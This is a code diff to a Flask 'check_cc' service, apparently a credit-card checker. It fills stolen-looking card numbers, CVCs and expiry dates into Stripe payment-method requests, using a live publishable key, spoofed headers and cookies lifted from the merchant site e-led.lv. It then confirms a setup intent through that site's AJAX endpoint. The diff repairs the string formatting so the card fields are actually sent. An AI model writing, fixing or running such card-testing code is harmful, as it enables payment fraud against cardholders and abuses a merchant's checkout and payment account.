@@ -1,6 +1,5 @@
 from flask import Flask, request, jsonify
 import requests
-import re
 
 app = Flask(__name__)
 
@@ -58,7 +57,10 @@ def check_cc(cc_data):
 
     bin_info = get_bin(cc)
 
-    # TERE ORIGINAL STRIPE HEADERS
+    # FIXED – MULTI-LINE STRING WITH .format()
+    data_stripe = """type=card&card[number]={} &card[cvc]={} &card[exp_year]={} &card[exp_month]={} &allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2F2ee772a1e3%3B+stripe-js-v3%2F2ee772a1e3%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fe-led.lv&time_on_page=96327&client_attribution_metadata[client_session_id]=5947447b-74ec-42d1-aa64-f880939047c1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=fe357b77-6fc9-43f8-82f8-1d04cb6dd2ca&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=5f4b7095-9d5d-4032-bc0c-511afd16336d4ec3ab&muid=588bccab-9133-4397-b3e2-f2785fdd613ca53fc1&sid=a5043f11-4679-4b52-962c-8747f54af89016e011&key=pk_live_51Kg8dtBXnyl1N5QY5UDJKCtBpYRB0SiGjpzJdN2sdcy3BxgAQRFtRxQEbm3lBmHQBzUWb3gz9bcVrkcMAVJ2xwav00P1HQeJHz&_stripe_version=2024-06-20""".format(cc, cvc, yy, mm)
+
+    # Stripe Headers
     headers_stripe = {
         'authority': 'api.stripe.com',
         'accept': 'application/json',
@@ -75,10 +77,7 @@ def check_cc(cc_data):
         'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
     }
 
-    # FIXED F-STRING – .format() SE BANA DIYA
-    data_stripe = ('type=card&card[number]={{cc}}&card[cvc]={{cvc}}&card[exp_year]={{yy}}&card[exp_month]={{mm}}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2F2ee772a1e3%3B+stripe-js-v3%2F2ee772a1e3%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fe-led.lv&time_on_page=96327&client_attribution_metadata[client_session_id]=5947447b-74ec-42d1-aa64-f880939047c1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=fe357b77-6fc9-43f8-82f8-1d04cb6dd2ca&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=5f4b7095-9d5d-4032-bc0c-511afd16336d4ec3ab&muid=588bccab-9133-4397-b3e2-f2785fdd613ca53fc1&sid=a5043f11-4679-4b52-962c-8747f54af89016e011&key=pk_live_51Kg8dtBXnyl1N5QY5UDJKCtBpYRB0SiGjpzJdN2sdcy3BxgAQRFtRxQEbm3lBmHQBzUWb3gz9bcVrkcMAVJ2xwav00P1HQeJHz&_stripe_version=2024-06-20").format(cc=cc, cvc=cvc, yy=yy, mm=mm)
-
-    # Step 1: Stripe Payment Method Create
+    # Step 1: Stripe PM Create
     try:
         stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, cookies=COOKIES, timeout=10)
         if stripe_response.status_code == 200:
@@ -91,7 +90,7 @@ def check_cc(cc_data):
     except Exception as e:
         return jsonify({"status": "error", "msg": str(e)})
 
-    # Step 2: Confirm Setup Intent (TERE ORIGINAL AJAX)
+    # Step 2: AJAX Confirm
     headers_ajax = {
         'authority': 'e-led.lv',
         'accept': '*/*',
